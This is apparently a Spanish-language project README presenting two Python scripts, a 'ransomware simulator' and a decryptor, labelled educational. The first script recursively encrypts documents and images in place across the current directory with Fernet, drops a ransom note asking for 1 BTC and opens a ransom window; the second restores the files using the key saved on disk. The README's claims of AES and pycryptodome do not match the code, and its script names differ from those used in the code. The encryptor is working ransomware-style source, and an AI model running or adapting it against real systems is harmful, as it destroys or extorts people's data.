# 🛡️ Simulador de Ransomware y Desencriptador AES en Python

Este proyecto consiste en **dos scripts escritos en Python 3.11** que simulan el proceso de cifrado y descifrado de archivos mediante el algoritmo **AES (Advanced Encryption Standard)**, con fines educativos y de concientización en ciberseguridad.

> ⚠️ **Este repositorio es solo para fines educativos.** No debe usarse para actividades maliciosas o no autorizadas.

---

## 📁 Contenido

"""
====================================================
    Nombre del Programa :     Simulador de Ransomware
    Descripción         :     Este script aplica cifrado AES a archivos seleccionados.
    Autor               :     Eddy Infante Mata
    Versión             :     1.0
    Fecha               :     26 de julio de 2025
    Lenguaje            :     Python 3.11
    Licencia            :     MIT License
====================================================
"""

# Copyright (c) 2025 [Eddy infante Mata]
#
# Por la presente se concede permiso, sin cargo, a cualquier persona que obtenga
# una copia de este software y los archivos de documentación asociados (el "Software"),
# para tratar el Software sin restricciones, incluyendo sin limitación los derechos
# para usar, copiar, modificar, fusionar, publicar, distribuir, sublicenciar y/o vender
# copias del Software, y permitir a las personas a quienes se les proporcione el Software
# hacerlo, sujeto a las siguientes condiciones:
#
# El aviso de copyright anterior y este aviso de permiso deberán incluirse en todas
# las copias o partes sustanciales del Software.
#
# EL SOFTWARE SE PROPORCIONA "TAL CUAL", SIN GARANTÍA DE NINGÚN TIPO, EXPRESA O IMPLÍCITA,
# INCLUYENDO PERO NO LIMITÁNDOSE A LAS GARANTÍAS DE COMERCIALIZACIÓN, IDONEIDAD PARA UN
# PROPÓSITO PARTICULAR Y NO INFRACCIÓN. EN NINGÚN CASO LOS AUTORES O LOS TITULARES DEL COPYRIGHT
# SERÁN RESPONSABLES POR NINGUNA RECLAMACIÓN, DAÑO U OTRA RESPONSABILIDAD, YA SEA EN UNA ACCIÓN
# DE CONTRATO, AGRAVIO O DE OTRO MODO, QUE SURJA DE O EN CONEXIÓN CON EL SOFTWARE O EL USO U
# OTRO TIPO DE ACCIONES EN EL SOFTWARE.



import os
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import webbrowser

# === CONFIGURACIÓN ===
EXTENSIONES_OBJETIVO = ['.txt', '.jpg', '.jpeg', '.png', '.docx', '.odt', '.ods', '.odp']
ID_VICTIMA = "VICTIMA_893472"
ID_VALIDO = "NUNCA_PAGAR"
LINK_DESCARGA = "#"  # Enlace simulado
ARCHIVOS_EXCLUIDOS = [
    "ransomware_simulador.py",
    "desencriptar.py",
    ".clave.key",
    ".README_RESCATE.txt"
]

# === FUNCIONES ===

def generar_clave():
    key = Fernet.generate_key()
    with open(".clave.key", "wb") as f:
        f.write(key)
    return key

def cifrar_archivos_en_directorio_actual(fernet):
    base_dir = os.path.abspath(".")
    for root, _, files in os.walk(base_dir):
        for nombre_archivo in files:
            if nombre_archivo in ARCHIVOS_EXCLUIDOS:
                continue
            if any(nombre_archivo.lower().endswith(ext) for ext in EXTENSIONES_OBJETIVO):
                ruta_completa = os.path.join(root, nombre_archivo)
                try:
                    with open(ruta_completa, "rb") as f:
                        datos = f.read()
                    datos_cifrados = fernet.encrypt(datos)
                    with open(ruta_completa, "wb") as f:
                        f.write(datos_cifrados)
                    print(f"🔒 Cifrado: {ruta_completa}")
                except Exception as e:
                    print(f"⚠️ Error con {ruta_completa}: {e}")

def crear_nota_rescate():
    texto = f"""
🛑 Tus archivos han sido cifrados 🛑

ID de víctima: {ID_VICTIMA}

Para recuperarlos:
1. Envía 1 BTC a: FAKE-WALLET
2. Ingresa el ID de transacción que recibiste para descargar la herramienta de desencriptado.

(Esto es una simulación educativa, no se ha producido daño real)
"""
    with open(".README_RESCATE.txt", "w") as f:
        f.write(texto)

def mostrar_interfaz_rescate():
    def verificar():
        ingresado = entrada.get().strip()
        if ingresado == ID_VALIDO:
            messagebox.showinfo("Éxito", "Transacción verificada. Puedes descargar la herramienta.")
            boton_descarga.config(state="normal")
        else:
            messagebox.showerror("Error", "ID de transacción incorrecto.")

    def descargar():
        webbrowser.open(LINK_DESCARGA)

    ventana = tk.Tk()
    ventana.title("Rescate de archivos")
    ventana.geometry("400x250")
    ventana.resizable(False, False)

    tk.Label(ventana, text="🔒 Tus archivos han sido cifrados", font=("Arial", 14, "bold")).pack(pady=(20, 5))
    tk.Label(ventana, text=f"🆔 Tu ID de víctima es: {ID_VICTIMA}", font=("Arial", 11)).pack(pady=(0, 10))
    tk.Label(ventana, text="Ingresa el ID de transacción:", font=("Arial", 11)).pack()

    entrada = tk.Entry(ventana, width=30)
    entrada.pack(pady=5)

    tk.Button(ventana, text="Verificar", command=verificar).pack(pady=5)

    boton_descarga = tk.Button(ventana, text="Descargar herramienta", state="disabled", command=descargar)
    boton_descarga.pack(pady=10)

    ventana.mainloop()

# === EJECUCIÓN PRINCIPAL ===

clave = generar_clave()
fernet = Fernet(clave)

cifrar_archivos_en_directorio_actual(fernet)
crear_nota_rescate()
mostrar_interfaz_rescate()


--------------------------------



"""
====================================================
    Nombre del Programa :     Simulador de Desencriptador
    Descripción         :     Este script intenta descifrar archivos previamente encriptados utilizando AES.
    Autor               :     Eddy Infante Mata
    Versión             :     1.0
    Fecha               :     26 de julio de 2025
    Lenguaje            :     Python 3.11
    Licencia            :     MIT License
====================================================
"""

# Copyright (c) 2025 [Eddy infante Mata]
#
# Por la presente se concede permiso, sin cargo, a cualquier persona que obtenga
# una copia de este software y los archivos de documentación asociados (el "Software"),
# para tratar el Software sin restricciones, incluyendo sin limitación los derechos
# para usar, copiar, modificar, fusionar, publicar, distribuir, sublicenciar y/o vender
# copias del Software, y permitir a las personas a quienes se les proporcione el Software
# hacerlo, sujeto a las siguientes condiciones:
#
# El aviso de copyright anterior y este aviso de permiso deberán incluirse en todas
# las copias o partes sustanciales del Software.
#
# EL SOFTWARE SE PROPORCIONA "TAL CUAL", SIN GARANTÍA DE NINGÚN TIPO, EXPRESA O IMPLÍCITA,
# INCLUYENDO PERO NO LIMITÁNDOSE A LAS GARANTÍAS DE COMERCIALIZACIÓN, IDONEIDAD PARA UN
# PROPÓSITO PARTICULAR Y NO INFRACCIÓN. EN NINGÚN CASO LOS AUTORES O LOS TITULARES DEL COPYRIGHT
# SERÁN RESPONSABLES POR NINGUNA RECLAMACIÓN, DAÑO U OTRA RESPONSABILIDAD, YA SEA EN UNA ACCIÓN
# DE CONTRATO, AGRAVIO O DE OTRO MODO, QUE SURJA DE O EN CONEXIÓN CON EL SOFTWARE O EL USO U
# OTRO TIPO DE ACCIONES EN EL SOFTWARE.

import os
from cryptography.fernet import Fernet, InvalidToken

# === CONFIGURACIÓN ===
EXTENSIONES_OBJETIVO = ['.txt', '.jpg', '.jpeg', '.png', '.docx', '.odt', '.ods', '.odp']
ARCHIVOS_EXCLUIDOS = [
    "ransomware_simulador.py",
    "desencriptar.py",
    ".clave.key",
    ".README_RESCATE.txt"
]

# === CARGAR CLAVE ===
if not os.path.exists(".clave.key"):
    print("❌ ERROR: No se encontró 'clave.key'. No se puede desencriptar.")
    exit()

with open(".clave.key", "rb") as f:
    clave = f.read()

fernet = Fernet(clave)

# === DESENCRIPTAR ARCHIVOS ===
archivos_restaurados = 0

for root, _, files in os.walk(os.path.abspath(".")):
    for nombre_archivo in files:
        if nombre_archivo in ARCHIVOS_EXCLUIDOS:
            continue
        if any(nombre_archivo.lower().endswith(ext) for ext in EXTENSIONES_OBJETIVO):
            ruta_completa = os.path.join(root, nombre_archivo)
            try:
                with open(ruta_completa, "rb") as f:
                    datos_cifrados = f.read()
                datos_descifrados = fernet.decrypt(datos_cifrados)
                with open(ruta_completa, "wb") as f:
                    f.write(datos_descifrados)
                archivos_restaurados += 1
                print(f"🔓 Restaurado: {ruta_completa}")
            except InvalidToken:
                print(f"⚠️ No se pudo desencriptar: {ruta_completa} (token inválido)")
            except Exception as e:
                print(f"⚠️ Error en {ruta_completa}: {e}")

if archivos_restaurados > 0:
    print(f"\n✅ Restauración completa: {archivos_restaurados} archivo(s) desencriptado(s).")
else:
    print("\n⚠️ No se desencriptó ningún archivo.")


---

## 🔐 ¿Qué hace el simulador?

El script de ransomware **encripta archivos en una carpeta específica**, simulando cómo actúan los ransomware reales. Luego, el desencriptador puede **revertir el proceso** si se proporciona la clave correcta.

### Ejemplo de flujo:
1. El usuario ejecuta `ransomware_simulado.py` y los archivos son cifrados.
2. Para recuperar los archivos, el usuario debe usar `desencriptador_simulado.py` con la clave original.

---

## 🛠️ Requisitos

- Python 3.11
- [`pycryptodome`](https://pypi.org/project/pycryptodome/):
  ```bash
  pip install pycryptodome
